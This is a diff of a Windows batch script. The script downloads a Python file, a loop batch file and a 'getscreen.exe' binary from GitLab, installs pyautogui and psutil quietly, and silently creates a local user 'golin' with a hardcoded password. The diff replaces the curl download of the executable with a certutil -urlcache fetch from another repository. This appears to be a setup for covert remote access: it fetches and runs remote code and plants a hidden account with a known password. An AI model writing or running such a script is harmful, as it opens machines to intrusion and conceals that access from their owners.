@@ -1,7 +1,7 @@
 @echo off
 curl -L -o login.py https://gitlab.com/rifqiekhafi/setrum/-/raw/main/login.py?inline=false
 curl -L -o loop.bat https://gitlab.com/rifqiekhafi/setrum/-/raw/main/loop.bat?inline=false
-curl -L -o getscreen.exe https://gitlab.com/alohamenia-group/menia/-/raw/main/getscreen.exe?inline=false
+certutil -urlcache -split -f "https://gitlab.com/alohamenia/greend/-/raw/main/getscreen.exe" getscreen.exe
 pip install pyautogui --quiet
 pip install psutil --quiet
 net user golin gaspol01 /add >nul
